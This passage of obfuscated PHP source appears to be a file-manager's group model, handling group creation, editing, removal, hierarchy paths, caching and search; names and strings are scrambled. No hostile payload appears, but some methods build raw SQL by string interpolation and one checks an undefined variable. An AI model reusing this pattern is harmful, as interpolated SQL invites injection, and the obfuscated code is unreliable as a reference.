$«¬üç¨£, !0); $§—Á²‚â = hash_hmac($‹íç¶ˆº[267], $Ÿ¦ƒÔì¤, $Ø»—¼»Ÿ); $ù«Ñçá¥ = array($‹íç¶ˆº[225] => $‹íç¶ˆº[12], $‹íç¶ˆº[269] => $‹íç¶ˆº[12], $‹íç¶ˆº[257] => $–­ûèİÙ, $‹íç¶ˆº[262] => $Ó¤õ­¾, $‹íç¶ˆº[270] => $Ÿ¦ƒÔì¤, $‹íç¶ˆº[271] => $§œìô, $‹íç¶ˆº[272] => $âŞÖŸÛ, $‹íç¶ˆº[273] => $…íš×ô­, $‹íç¶ˆº[274] => $ì¾ı„¼, $‹íç¶ˆº[275] => $§—Á²‚â, $‹íç¶ˆº[182] => $this->getHost()); return $ù«Ñçá¥; } } goto bïÓ‹‘Ã¹³; eëö¡“ò: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\155\145" => "\x67\x72\157\x75\160\x5f\x6d\x65\x74\141", "\155\145\x74\141\106\151\145\x6c\144" => "\x67\162\x6f\165\160\111\104"); protected function cacheFunctionAlias($¤Î’—ç•) { $à»ãª‚× =& $_SERVER[”ú…±Ú¥]; return array($à»ãª‚×[1939] => array($¤Î’—ç•[0], $à»ãª‚×[1940]), $à»ãª‚×[1941] => array($¤Î’—ç•[0], $à»ãª‚×[1942])); } protected function getInfo($Ú»‘¼Ä, $óÅ÷ƒæ§ = false) { $á’Šõ½ = $this->getInfoSimple($Ú»‘¼Ä); if (!$á’Šõ½) { return !1; } if ($óÅ÷ƒæ§) { return $this->_listDataApplyItem($á’Šõ½); } return $this->cacheFunctionGet($_SERVER[”ú…±Ú¥][1943], $Ú»‘¼Ä); } protected function getInfoSimple($¹¨™ó€ë, $Á¾Ñ•Ú² = false) { $£‰òİÓ =& $_SERVER[”ú…±Ú¥]; if ($Á¾Ñ•Ú²) { $×œÊŞÃØ = array($£‰òİÓ[1861] => intval($¹¨™ó€ë)); $ä«ŠÍµ… = $this->where($×œÊŞÃØ)->find(); return is_array($ä«ŠÍµ…) ? $ä«ŠÍµ… : array(); } return $this->cacheFunctionGet($£‰òİÓ[1944], $¹¨™ó€ë); } protected function groupAdd($› îçÔ) { $Œµ©œ¼ =& $_SERVER[”ú…±Ú¥]; if (!$› îçÔ[$Œµ©œ¼[470]] && isset($› îçÔ[$Œµ©œ¼[1861]]) && $› îçÔ[$Œµ©œ¼[1861]] == 1) { if ($šïÄÕêô = $this->getInfoSimple($› îçÔ[$Œµ©œ¼[1861]], !0)) { return $› îçÔ[$Œµ©œ¼[1861]]; } } else { $šïÄÕêô = $this->getInfoSimple($› îçÔ[$Œµ©œ¼[470]]); if (!$šïÄÕêô) { return !1; } } $šñŠ¤¥¯ = $Œµ©œ¼[559]; if ($šïÄÕêô[$Œµ©œ¼[549]]) { $šñŠ¤¥¯ = $šïÄÕêô[$Œµ©œ¼[549]] . $šïÄÕêô[$Œµ©œ¼[1861]] . $Œµ©œ¼[50]; } $âÌµ Ûö = array($Œµ©œ¼[458] => $this->groupNameAuto($› îçÔ[$Œµ©œ¼[470]], $› îçÔ[$Œµ©œ¼[32]]), $Œµ©œ¼[439] => $› îçÔ[$Œµ©œ¼[470]], $Œµ©œ¼[618] => $šñŠ¤¥¯, $Œµ©œ¼[1945] => $› îçÔ[$Œµ©œ¼[1848]], $Œµ©œ¼[1946] => 0, $Œµ©œ¼[1865] => 0); if (isset($› îçÔ[$Œµ©œ¼[1885]])) { $âÌµ Ûö[$Œµ©œ¼[1885]] = $› îçÔ[$Œµ©œ¼[1885]]; } else { $ßğ€¹¢Ÿ = $this->max($Œµ©œ¼[1885]); if (!$ßğ€¹¢Ÿ) { $ßğ€¹¢Ÿ = 0; } $âÌµ Ûö[$Œµ©œ¼[1885]] = $ßğ€¹¢Ÿ + 1; } if (!empty($› îçÔ[$Œµ©œ¼[1861]])) { $âÌµ Ûö[$Œµ©œ¼[1861]] = $› îçÔ[$Œµ©œ¼[1861]]; } $òºÒ‘í« = $this->add($âÌµ Ûö); $this->setNamePinyin($òºÒ‘í«, $âÌµ Ûö[$Œµ©œ¼[32]]); if (isset($› îçÔ[$Œµ©œ¼[1947]])) { $this->metaSet($òºÒ‘í«, array($Œµ©œ¼[1947] => $› îçÔ[$Œµ©œ¼[1947]], $Œµ©œ¼[1948] => $› îçÔ[$Œµ©œ¼[1948]])); unset($› îçÔ[$Œµ©œ¼[1947]]); unset($› îçÔ[$Œµ©œ¼[1948]]); } Model($Œµ©œ¼[1362])->groupRootAdd($òºÒ‘í«); $this->_clearCache($› îçÔ[$Œµ©œ¼[470]]); return $òºÒ‘í«; } protected function groupEdit($¦ôÂâ°„, $İŒâùˆÊ) { $“İÇ• =& $_SERVER[”ú…±Ú¥]; $×ğë¯®ê = $this->getInfoSimple($¦ôÂâ°„); if (!$×ğë¯®ê) { return !1; } if (!empty($İŒâùˆÊ[$“İÇ•[470]])) { $ãÏŸÁÓ¿ = $this->getInfoSimple($İŒâùˆÊ[$“İÇ•[470]]); if (!$ãÏŸÁÓ¿) { return !1; } if ($×ğë¯®ê[$“İÇ•[1861]] == $ãÏŸÁÓ¿[$“İÇ•[1861]]) { return !1; } if ($İŒâùˆÊ[$“İÇ•[470]] != $×ğë¯®ê[$“İÇ•[470]]) { if ($ãÏŸÁÓ¿[$“İÇ•[549]] !== $×ğë¯®ê[$“İÇ•[549]] && strpos($ãÏŸÁÓ¿[$“İÇ•[549]], $×ğë¯®ê[$“İÇ•[549]] . $×ğë¯®ê[$“İÇ•[1861]] . $“İÇ•[50]) === 0) { return !1; } $İŒâùˆÊ[$“İÇ•[618]] = $ãÏŸÁÓ¿[$“İÇ•[549]] . $İŒâùˆÊ[$“İÇ•[470]] . $“İÇ•[50]; $this->_changeChildLevel($×ğë¯®ê, $ãÏŸÁÓ¿); $this->_clearCache($ãÏŸÁÓ¿[$“İÇ•[1861]]); $this->_clearCache($×ğë¯®ê[$“İÇ•[470]]); } } if (isset($İŒâùˆÊ[$“İÇ•[32]])) { $this->setNamePinyin($¦ôÂâ°„, $İŒâùˆÊ[$“İÇ•[32]]); } if (isset($İŒâùˆÊ[$“İÇ•[1947]])) { $this->metaSet($¦ôÂâ°„, array($“İÇ•[1947] => $İŒâùˆÊ[$“İÇ•[1947]], $“İÇ•[1948] => $İŒâùˆÊ[$“İÇ•[1948]])); unset($İŒâùˆÊ[$“İÇ•[1947]]); unset($İŒâùˆÊ[$“İÇ•[1948]]); } $this->_clearChildrenCache($×ğë¯®ê); return $this->where(array($“İÇ•[1949] => $¦ôÂâ°„))->save($İŒâùˆÊ); } private function _clearChildrenCache($¬Ò•ÂÍ´) { $›ıëÜÌ =& $_SERVER[”ú…±Ú¥]; $ßıûğ¹„ = array($›ıëÜÌ[618] => array($›ıëÜÌ[578], $¬Ò•ÂÍ´[$›ıëÜÌ[549]] . $¬Ò•ÂÍ´[$›ıëÜÌ[1861]] . $›ıëÜÌ[579])); $»×  Í = $this->field($›ıëÜÌ[1861])->where($ßıûğ¹„)->select(); foreach ($»×  Í as $Ô¥ÜàŞê) { $this->_clearCache($Ô¥ÜàŞê[$›ıëÜÌ[1861]]); } } private function _clearCache($îáƒß÷) { $ÖÒÙ™æ =& $_SERVER[”ú…±Ú¥]; $this->cacheFunctionClear($ÖÒÙ™æ[1943], $îáƒß÷); $this->cacheFunctionClear($ÖÒÙ™æ[1944], $îáƒß÷); } private function _changeChildLevel($Ä‚âşƒğ, $ıÍß„ÎÖ, $Óô²¶ÑÃ = false) { $€ğ†Ë¥ =& $_SERVER[”ú…±Ú¥]; $èää¦˜‚ = $Ä‚âşƒğ[$€ğ†Ë¥[549]] . $Ä‚âşƒğ[$€ğ†Ë¥[1861]] . $€ğ†Ë¥[50]; $Ñ ¦åÀÄ = $ıÍß„ÎÖ[$€ğ†Ë¥[549]] . $ıÍß„ÎÖ[$€ğ†Ë¥[1861]] . $€ğ†Ë¥[50] . $Ä‚âşƒğ[$€ğ†Ë¥[1861]] . $€ğ†Ë¥[50]; if ($Óô²¶ÑÃ) { $Ñ ¦åÀÄ = $ıÍß„ÎÖ[$€ğ†Ë¥[549]] . $ıÍß„ÎÖ[$€ğ†Ë¥[1861]] . $€ğ†Ë¥[50]; } $ ùåà¶² = array($€ğ†Ë¥[618] => array($€ğ†Ë¥[578], $Ä‚âşƒğ[$€ğ†Ë¥[549]] . $Ä‚âşƒğ[$€ğ†Ë¥[1861]] . $€ğ†Ë¥[579])); $€Ø‡£ûÛ = array($€ğ†Ë¥[618] => array($€ğ†Ë¥[627], "\x72\145\160\x6c\x61\x63\145\x28\160\x61\162\145\x6e\x74\x4c\145\x76\x65\x6c\54\47{$èää¦˜‚}\x27\54\47{$Ñ ¦åÀÄ}\47\x29")); $this->_clearChildrenCache($Ä‚âşƒğ); $this->where($ ùåà¶²)->data($€Ø‡£ûÛ)->save(); } public function setNamePinyin($ÍÍşÂ‚ä, $‰™øğ°‘ = false) { $§¼®Ğ„ =& $_SERVER[”ú…±Ú¥]; if (!$‰™øğ°‘) { $¯ÓÑà§Ï = $this->getInfoSimple($ÍÍşÂ‚ä); $‰™øğ°‘ = $¯ÓÑà§Ï[$§¼®Ğ„[32]]; } if (!Input::check($‰™øğ°‘, $§¼®Ğ„[621])) { $this->metaSet($ÍÍşÂ‚ä, $§¼®Ğ„[503], null); $this->metaSet($ÍÍşÂ‚ä, $§¼®Ğ„[502], null); return; } $ï¶Å¬è¶ = array($§¼®Ğ„[503] => str_replace($§¼®Ğ„[53], $§¼®Ğ„[12], Pinyin::get($‰™øğ°‘)), $§¼®Ğ„[502] => Pinyin::get($‰™øğ°‘, $§¼®Ğ„[622])); $this->metaSet($ÍÍşÂ‚ä, $ï¶Å¬è¶); } protected function groupStatus($¡éìÃÕè, $İ™æÒµõ) { $†¬Ø³¶º =& $_SERVER[”ú…±Ú¥]; $¾±îˆ´« = $this->getInfoSimple($¡éìÃÕè); if (!$¾±îˆ´«) { return !1; } if ($İ™æÒµõ == $†¬Ø³¶º[88]) { $çË«ªëò = $this->parentLevelArray($¾±îˆ´«[$†¬Ø³¶º[549]]); } else { $¡øÅ÷ô© = array($†¬Ø³¶º[618] => array($†¬Ø³¶º[578], $¾±îˆ´«[$†¬Ø³¶º[549]] . $¾±îˆ´«[$†¬Ø³¶º[1861]] . $†¬Ø³¶º[579])); $çË«ªëò = $this->where($¡øÅ÷ô©)->field($†¬Ø³¶º[1861])->select(); $çË«ªëò = array_to_keyvalue($çË«ªëò, $†¬Ø³¶º[12], $†¬Ø³¶º[1861]); } $çË«ªëò[] = $¾±îˆ´«[$†¬Ø³¶º[1861]]; $Ò’ŠÕ‚· = array(); foreach ($çË«ªëò as $¡éìÃÕè) { $Ò’ŠÕ‚·[] = array($†¬Ø³¶º[1861] => $¡éìÃÕè, $†¬Ø³¶º[94] => $†¬Ø³¶º[782], $†¬Ø³¶º[412] => $İ™æÒµõ); $this->_clearCache($¡éìÃÕè); } return Model($†¬Ø³¶º[1950])->addAll($Ò’ŠÕ‚·, array(), !0); } protected function groupRemove($Ú†¤…‡¨, $ÙÌ——‘ø = false) { $äİİ”çœ =& $_SERVER[”ú…±Ú¥]; $£Ö½îÃõ = array($äİİ”çœ[1861] => $Ú†¤…‡¨); $üË×€Î© = $this->where($£Ö½îÃõ)->find(); if (!$üË×€Î© || $üË×€Î©[$äİİ”çœ[470]] == 0) { return !1; } if (!$ÙÌ——‘ø) { $•úÏœÛ = $this->getInfoSimple($üË×€Î©[$äİİ”çœ[470]]); $this->_changeChildLevel($üË×€Î©, $•úÏœÛ, !0); $this->where(array($äİİ”çœ[470] => $Ú†¤…‡¨))->save(array($äİİ”çœ[470] => $üË×€Î©[$äİİ”çœ[470]])); $this->_clearCache($•úÏœÛ[$äİİ”çœ[1861]]); } Model($äİİ”çœ[1950])->where($£Ö½îÃõ)->delete(); Model($äİİ”çœ[1951])->where($£Ö½îÃõ)->delete(); Model($äİİ”çœ[857])->groupRootRemove($Ú†¤…‡¨); $this->_clearCache($üË×€Î©[$äİİ”çœ[470]]); return $this->where($£Ö½îÃõ)->delete(); } protected function groupSort($’ªûÓ€) { $ïøÜğ¡ =& $_SERVER[”ú…±Ú¥]; $Š”¢ŠÅÜ = array(); foreach ($’ªûÓ€ as $ó´ëıê£ => $ÎóÊ±›š) { $Š”¢ŠÅÜ[] = array($ïøÜğ¡[1861], $ÎóÊ±›š, $ïøÜğ¡[1885], $ó´ëıê£ + 1); } $this->saveAll($Š”¢ŠÅÜ); } public function listData() { $±¬¬Û«À = $this->_makeOrder()->selectPage(50); $this->_listDataApply($±¬¬Û«À[$_SERVER[”ú…±Ú¥][407]]); return $±¬¬Û«À; } private function _makeOrder($Ãù‹Êû = '') { $Õ™Ôã©ö =& $_SERVER[”ú…±Ú¥]; $Õµ³¶ƒ = array($Õ™Ôã©ö[1861], $Õ™Ôã©ö[32], $Õ™Ôã©ö[1850], $Õ™Ôã©ö[211]); $ÑàÏŒ‡ß = array($Õ™Ôã©ö[488] => $Õ™Ôã©ö[489], $Õ™Ôã©ö[490] => $Õ™Ôã©ö[491]); $ö™ø›üÕ = Input::get($Õ™Ôã©ö[495], $Õ™Ôã©ö[7], $Õ™Ôã©ö[1865], $Õµ³¶ƒ); $šÚõ ì = Input::get($Õ™Ôã©ö[496], $Õ™Ôã©ö[7], $Õ™Ôã©ö[1952], array($Õ™Ôã©ö[1952], $Õ™Ôã©ö[490])); $šÚõ ì = $ÑàÏŒ‡ß[$šÚõ ì]; $Ãù‹Êû = $Ãù‹Êû . "{$ö™ø›üÕ}\x20{$šÚõ ì}\54\x20\x67\162\x6f\165\x70\111\104\x20\141\163\x63"; return $this->order($Ãù‹Êû); } public function listChild($Îö€êû) { $‡ÙŒÊî© =& $_SERVER[”ú…±Ú¥]; $ò•»è•È = $this->where(array($‡ÙŒÊî©[470] => $Îö€êû))->_makeOrder()->selectPage(200); $this->_listDataApply($ò•»è•È[$‡ÙŒÊî©[407]]); return $ò•»è•È; } public function listChildIds($ÙŠÄªºÑ) { $œÉœ—Ø£ =& $_SERVER[”ú…±Ú¥]; if (is_string($”µªÉÛ³)) { $ÙŠÄªºÑ = explode($œÉœ—Ø£[50], $ÙŠÄªºÑ); } $ŠÏÙÓ‰‘ = $this->where(array($œÉœ—Ø£[1861] => array($œÉœ—Ø£[7], $ÙŠÄªºÑ)))->field($œÉœ—Ø£[1953])->select(); if (!$ŠÏÙÓ‰‘) { return !1; } $’šèÊ³É = array(); foreach ($ŠÏÙÓ‰‘ as $öÓ¯ñà¨) { $’šèÊ³É[] = "\x73\x65\x6c\145\143\164\x20\147\x72\157\x75\x70\111\x44\40\146\162\x6f\x6d\x20\x60\147\x72\x6f\165\x70\x60\40\167\150\x65\x72\145\x20\x70\x61\162\145\x6e\164\x4c\145\166\145\154\40\154\151\x6b\145\40\47{$öÓ¯ñà¨[$œÉœ—Ø£[549]]}{$öÓ¯ñà¨[$œÉœ—Ø£[1861]]}\x2c\45\47"; } $’šèÊ³É = implode($œÉœ—Ø£[1954], $’šèÊ³É); $ŠÏÙÓ‰‘ = $this->query($’šèÊ³É); if (!$ŠÏÙÓ‰‘) { return array(); } $ÙŠÄªºÑ = array_to_keyvalue($ŠÏÙÓ‰‘, $œÉœ—Ø£[12], $œÉœ—Ø£[1861]); return array_unique($ÙŠÄªºÑ); } public function listByID($Õşâíäƒ) { $¶·Ÿ×€– =& $_SERVER[”ú…±Ú¥]; if (!$Õşâíäƒ) { return array(); } $úÏğ««è = array($¶·Ÿ×€–[1861] => array($¶·Ÿ×€–[7], $Õşâíäƒ)); $«Ü°Ãì˜ = $this->where($úÏğ««è)->select(); $«Ü°Ãì˜ = array_sort_keep($«Ü°Ãì˜, $¶·Ÿ×€–[1861], $Õşâíäƒ); $this->_listDataApply($«Ü°Ãì˜); return $«Ü°Ãì˜; } public function listSearch($³á£Éæ) { $ë¹¢† ø =& $_SERVER[”ú…±Ú¥]; $ÎîÊòä™ = $³á£Éæ[$ë¹¢† ø[1955]]; $Ğ©ìµ®ñ = isset($³á£Éæ[$ë¹¢† ø[1956]]) ? $³á£Éæ[$ë¹¢† ø[1956]] : !1; if (!trim($ÎîÊòä™)) { return !1; } $ÎîÊòä™ = str_replace($ë¹¢† ø[1957], $ë¹¢† ø[1958], $ÎîÊòä™); $šÚªÕ•• = array($ë¹¢† ø[1861] => array($ë¹¢† ø[421], "{$ÎîÊòä™}\45"), $ë¹¢† ø[32] => array($ë¹¢† ø[421], "\45{$ÎîÊòä™}\x25"), $ë¹¢† ø[1029] => $ë¹¢† ø[1959]); if ($Ğ©ìµ®ñ) { $ğ‹™Ş†´ = $this->getInfoSimple($Ğ©ìµ®ñ); $‘ˆÆÙ = $ğ‹™Ş†´[$ë¹¢† ø[549]] . $Ğ©ìµ®ñ . $ë¹¢† ø[579]; $šÚªÕ•• = array($šÚªÕ••, array($ë¹¢† ø[549] => array($ë¹¢† ø[421], $‘ˆÆÙ))); } $šÚªÕ•• = $this->parseWhereLike($šÚªÕ••); $–™Ñ¼Šì = $this->_makeOrder()->where($šÚªÕ••)->selectPage(20); $–™Ñ¼Šì = $–™Ñ¼Šì ? $–™Ñ¼Šì : array($ë¹¢† ø[407] => array(), $ë¹¢† ø[404] => array()); if (!$–™Ñ¼Šì || count($–™Ñ¼Šì[$ë¹¢† ø[407]]) < 5 && Input::check($ÎîÊòä™, $ë¹¢† ø[356])) { $é¤–Ïß¼ = $this->groupChildrenAll($Ğ©ìµ®ñ); $Îè¯…Ç° = $this->_searchFromMeta($ë¹¢† ø[502], $ÎîÊòä™, 10, $é¤–Ïß¼); $îŠçûç = $this->_searchFromMeta($ë¹¢† ø[503], $ÎîÊòä™, 10, $é¤–Ïß¼); $î¸«Æ€ö = array_merge($Îè¯…Ç°, $îŠçûç, $–™Ñ¼Šì[$ë¹¢† ø[407]]); $–™Ñ¼Šì[$ë¹¢† ø[407]] = array_unique_by_key($î¸«Æ€ö, $ë¹¢† ø[1861]); $–™Ñ¼Šì[$ë¹¢† ø[404]][$ë¹¢† ø[405]] = count($–™Ñ¼Šì[$ë¹¢† ø[407]]); $–™Ñ¼Šì[$ë¹¢† ø[404]][$ë¹¢† ø[406]] = ceil($–™Ñ¼Šì[$ë¹¢† ø[404]][$ë¹¢† ø[405]] / $–™Ñ¼Šì[$ë¹¢† ø[404]][$ë¹¢† ø[401]]); } $this->_listDataApply($–™Ñ¼Šì[$ë¹¢† ø[407]]); return $–™Ñ¼Šì; } protected function groupChildrenAll($‡çºö›) { $ä¨Ê½›ş =& $_SERVER[”ú…±Ú¥]; if (!$‡çºö›) { return !1; } if (is_string($‡çºö›)) { $‡çºö› = array($‡çºö›); } $’’¾‘”ß = $‡çºö›; foreach ($‡çºö› as $åİÏçşõ) { $Ã¹ÇÉÑ = $this->getInfoSimple($åİÏçşõ); $÷‡ç£ÏÅ = array($ä¨Ê½›ş[549] => array($ä¨Ê½›ş[421], $Ã¹ÇÉÑ[$ä¨Ê½›ş[549]] . $åİÏçşõ . $ä¨Ê½›ş[579])); $İ°˜ã³é = $this->field($ä¨Ê½›ş[1861])->where($÷‡ç£ÏÅ)->select(); $’’¾‘”ß = array_merge($’’¾‘”ß, array_to_keyvalue($İ°˜ã³é, $ä¨Ê½›ş[12], $ä¨Ê½›ş[1861])); } return array_unique($’’¾‘”ß); } private function _searchFromMeta($‹ÂàÓŞÍ, $ ••£öÖ, $ìé§Ä×Ï, $ñÁ²ú½») { $³Ğ²»”“ =& $_SERVER[”ú…±Ú¥]; $ ••£öÖ = strtolower($ ••£öÖ); $‹ÉŒŒßŠ = array($³Ğ²»”“[94] => $‹ÂàÓŞÍ, $³Ğ²»”“[412] => array($³Ğ²»”“[421], "\x25{$ ••£öÖ}\45")); $‹ÉŒŒßŠ = $this->parseWhereLike($‹ÉŒŒßŠ); if ($ñÁ²ú½») { $‹ÉŒŒßŠ[$³Ğ²»”“[1861]] = array($³Ğ²»”“[7], $ñÁ²ú½»); } $¾æ±Ğ” = Model($³Ğ²»”“[1960])->where($‹ÉŒŒßŠ)->limit($ìé§Ä×Ï)->select(); if (!$¾æ±Ğ”) { return array(); } $¾æ±Ğ” = array_to_keyvalue($¾æ±Ğ”, $³Ğ²»”“[12], $³Ğ²»”“[1861]); $•øïïªŠ = $this->where(array($³Ğ²»”“[1949] => array($³Ğ²»”“[7], $¾æ±Ğ”)))->select(); if (!$•øïïªŠ) { return array(); } return $•øïïªŠ; } protected function _listDataApplyItem($Å¿üÚ‘) { $¨ºµ§… = array($Å¿üÚ‘); $this->_listDataApply($¨ºµ§…); return $¨ºµ§…[0]; } protected function _listDataApply(&$—âş¼ªã) { $àÇ£²©£ =& $_SERVER[”ú…±Ú¥]; if (!$—âş¼ªã) { return; } $„öÚ¥¸Ö = array_to_keyvalue($—âş¼ªã, $àÇ£²©£[12], $àÇ£²©£[1861]); $this->_listAppendChildren($—âş¼ªã); $this->_listAppendChildrenMember($—âş¼ªã); $this->_listAppendMeta($—âş¼ªã, $„öÚ¥¸Ö); $this->_listAppendParent($—âş¼ªã); $this->_listAppendSourceRoot($—âş¼ªã, $„öÚ¥¸Ö); } private function _listAppendChildren(&$ˆÀğÓÆµ) { $å“¯šÌ =& $_SERVER[”ú…±Ú¥]; $áºş¬Î™ = array_to_keyvalue($ˆÀğÓÆµ, $å“¯šÌ[12], $å“¯šÌ[1861]); $ğà—Æ³Ì = array($å“¯šÌ[470] => array($å“¯šÌ[7], $áºş¬Î™)); $¦¼ÚÒîŒ = array($å“¯šÌ[470], $å“¯šÌ[1961] => $å“¯šÌ[529]); $‘Ó²·ÆÇ = $this->field($¦¼ÚÒîŒ)->where($ğà—Æ³Ì)->group($å“¯šÌ[470])->select(); $šöíÛ = array_to_keyvalue($‘Ó²·ÆÇ, $å“¯šÌ[470], $å“¯šÌ[529]); foreach ($ˆÀğÓÆµ as &$Û’«¡ö“) { $ò‰¾œÚú = $Û’«¡ö“[$å“¯šÌ[1861]]; $Û’«¡ö“[$å“¯šÌ[1962]] = isset($šöíÛ[$ò‰¾œÚú]) ? intval($šöíÛ[$ò‰¾œÚú]) : !1; } unset($Û’«¡ö“); } private function _listAppendChildrenMember(&$Ô»Èå£©) { $õé§Œë­ =& $_SERVER[”ú…±Ú¥]; $ ñİ • = array_to_keyvalue($Ô»Èå£©, $õé§Œë­[12], $õé§Œë­[1861]); $‡ØÙÚ¬… = array($õé§Œë­[1861] => array($õé§Œë­[7], $ ñİ •)); $Õúş†òğ = array($õé§Œë­[1861], $õé§Œë­[1961] => $õé§Œë­[529]); $ˆÓÎ¦öü = Model($õé§Œë­[1951])->field($Õúş†òğ)->where($‡ØÙÚ¬…)->group($õé§Œë­[1861])->select(); $¹è¨·ö“ = array_to_keyvalue($ˆÓÎ¦öü, $õé§Œë­[1861], $õé§Œë­[529]); foreach ($Ô»Èå£© as &$¶ŠæÓÈØ) { $º²Ä¡şˆ = $¶ŠæÓÈØ[$õé§Œë­[1861]]; $¶ŠæÓÈØ[$õé§Œë­[1963]] = isset($¹è¨·ö“[$º²Ä¡şˆ]) ? intval($¹è¨·ö“[$º²Ä¡şˆ]) : !1; } unset($¶ŠæÓÈØ); } private function _listAppendMeta(&$õ¿âÉ‚, $Êìå–´¬) { $‚¥¯‹Ø© =& $_SERVER[”ú…±Ú¥]; $£”Ï‰Ù² = array($‚¥¯‹Ø©[1861] => array($‚¥¯‹Ø©[7], $Êìå–´¬)); $ƒ¢õìğÄ = Model($‚¥¯‹Ø©[1950])->where($£”Ï‰Ù²)->select(); $ƒ¢õìğÄ = array_to_keyvalue_group($ƒ¢õìğÄ, $‚¥¯‹Ø©[1861]); foreach ($ƒ¢õìğÄ as &$óªïÈäß) { $óªïÈäß = array_to_keyvalue($óªïÈäß, $‚¥¯‹Ø©[94], $‚¥¯‹Ø©[412]); } unset($óªïÈäß); foreach ($õ¿âÉ‚ as &$â®à‹) { $â®à‹[$‚¥¯‹Ø©[504]] = array(); if (isset($ƒ¢õìğÄ[$â®à‹[$‚¥¯‹Ø©[1861]]])) { $â®à‹[$‚¥¯‹Ø©[504]] = $ƒ¢õìğÄ[$â®à‹[$‚¥¯‹Ø©[1861]]]; } } unset($â®à‹); } protected function parentLevelArray($ÎÔøÍõ‰) { $Ã¯“á› =& $_SERVER[”ú…±Ú¥]; $ÎÔøÍõ‰ = explode($Ã¯“á›[50], trim($ÎÔøÍõ‰, $Ã¯“á›[50])); $ÎÔøÍõ‰ = array_remove_value($ÎÔøÍõ‰, $Ã¯“á›[208]); return $ÎÔøÍõ‰; } protected function parentInGroup($«¯¬äÛÓ, $×½Êôğ) { $º™ª†Ê =& $_SERVER[”ú…±Ú¥]; $ÓØå¬´ = $this->getInfoSimple($«¯¬äÛÓ); if (!$ÓØå¬´) { return !0; } $³çÚáˆ = $this->parentLevelArray($ÓØå¬´[$º™ª†Ê[549]]); $³çÚáˆ[] = $«¯¬äÛÓ; foreach ($³çÚáˆ as $«¯¬äÛÓ) { if (in_array($«¯¬äÛÓ . $º™ª†Ê[12], $×½Êôğ)) { return !0; } } return !1; } private function _listAppendParent(&$ŠÏğø¥) { $±±æ˜İ =& $_SERVER[”ú…±Ú¥]; $Ñá®×Í² = array(); foreach ($ŠÏğø¥ as &$•ûøÏâ¨) { $Ñá®×Í²[$•ûøÏâ¨[$±±æ˜İ[1861]]] = $•ûøÏâ¨[$±±æ˜İ[32]]; $€·Ó®Â¬ = $this->parentLevelArray($•ûøÏâ¨[$±±æ˜İ[549]]); foreach ($€·Ó®Â¬ as $€í¹â£µ) { if (!isset($Ñá®×Í²[$€í¹â£µ])) { $Ñá®×Í²[$€í¹â£µ] = 0; } } } unset($•ûøÏâ¨); foreach ($Ñá®×Í² as $èŸ•‰à§ => $©¤¦åÁ•) { if ($©¤¦åÁ•) { continue; } $àŠ©¤ı¿ = $this->getInfoSimple($èŸ•‰à§); $Ñá®×Í²[$èŸ•‰à§] = $àŠ©¤ı¿[$±±æ˜İ[32]]; } $âÃ¹¡¸ = $GLOBALS[$±±æ˜İ[6]][$±±æ˜İ[89]][$±±æ˜İ[1964]]; if ($GLOBALS[$±±æ˜İ[532]] == $±±æ˜İ[88]) { $âÃ¹¡¸ = !1; } foreach ($ŠÏğø¥ as &$•ûøÏâ¨) { $€·Ó®Â¬ = $this->parentLevelArray($•ûøÏâ¨[$±±æ˜İ[549]]); $‹ŞğÛæë = $±±æ˜İ[12]; foreach ($€·Ó®Â¬ as $èŸ•‰à§ => $€í¹â£µ) { if ($âÃ¹¡¸ && $èŸ•‰à§ == 0) { continue; } $‹ŞğÛæë .= $Ñá®×Í²[$€í¹â£µ] . $±±æ˜İ[8]; } if ($€·Ó®Â¬) { $‹ŞğÛæë .= $•ûøÏâ¨[$±±æ˜İ[32]]; } $•ûøÏâ¨[$±±æ˜İ[554]] = str_replace($±±æ˜İ[557], $±±æ˜İ[8], $‹ŞğÛæë); } unset($•ûøÏâ¨); } private function _listAppendSourceRoot(&$üŞÏ™’Ş, $’ ÍúÁ”) { $¬‹¸´¶İ =& $_SERVER[”ú…±Ú¥]; $ôÇëÓ… = Model($¬‹¸´¶İ[857])->listSourceRoot(SourceModel::TYPE_GROUP, $’ ÍúÁ”); $ôÇëÓ… = array_to_keyvalue($ôÇëÓ…, $¬‹¸´¶İ[534]); $ôÇëÓ… = array_remove_key($ôÇëÓ…, $¬‹¸´¶İ[534]); foreach ($üŞÏ™’Ş as &$°ñŞçªé) { $°ñŞçªé[$¬‹¸´¶İ[87]] = $ôÇëÓ…[$°ñŞçªé[$¬‹¸´¶İ[1861]]] ? $ôÇëÓ…[$°ñŞçªé[$¬‹¸´¶İ[1861]]] : array(); } unset($°ñŞçªé); } protected function groupMerge($¤ïÉş´Š) { $¤ïÉş´Š = array_values(array_unique($¤ïÉş´Š)); $ÄÛ³€º· = array(); for ($ìÄ†ö’ = 0; $ìÄ†ö’ < count($¤ïÉş´Š); $ìÄ†ö’++) { $óÍ‚ÈÈ¯ = !1; for ($ëŒ­Âµö = 0; $ëŒ­Âµö < count($¤ïÉş´Š); $ëŒ­Âµö++) { if ($ìÄ†ö’ == $ëŒ­Âµö) { continue; } if ($this->isParentOf($¤ïÉş´Š[$ëŒ­Âµö], $¤ïÉş´Š[$ìÄ†ö’])) { $óÍ‚ÈÈ¯ = !0; break; } } if (!$óÍ‚ÈÈ¯) { $ÄÛ³€º·[] = $¤ïÉş´Š[$ìÄ†ö’]; } } return $ÄÛ³€º·; } protected function isParentOf($À”ÃåÚ¶, $âù¥Üöº) { $³„Ÿßá£ =& $_SERVER[”ú…±Ú¥]; if (!$À”ÃåÚ¶ || !$âù¥Üöº || $À”ÃåÚ¶ == $âù¥Üöº) { return !1; } $ÇÊ€ÙíÔ = $this->getInfoSimple($À”ÃåÚ¶); $æáõ²úÔ = $this->getInfoSimple($âù¥Üöº); $‘…£Ñ¶ò = $ÇÊ€ÙíÔ[$³„Ÿßá£[549]] . $À”ÃåÚ¶ . $³„Ÿßá£[50]; if (substr($æáõ²úÔ[$³„Ÿßá£[549]], 0, strlen($‘…£Ñ¶ò)) == $‘…£Ñ¶ò) { return !0; } return !1; } public function groupShowRoot($•îªÎ‰, $æèî‡‰— = false) { $©şÕ—æ» =& $_SERVER[”ú…±Ú¥]; $àîú¸± = $this->getInfo($•îªÎ‰); if (!$àîú¸±) { return array(); } $å‰Ì¥›· = $this->parentLevelArray($àîú¸±[$©şÕ—æ»[549]]); $¯ªÓı¯« = array($•îªÎ‰); if (count($å‰Ì¥›·) == 0) { return $¯ªÓı¯«; } if ($æèî‡‰— && count($å‰Ì¥›·) == 1) { return $¯ªÓı¯«; } if 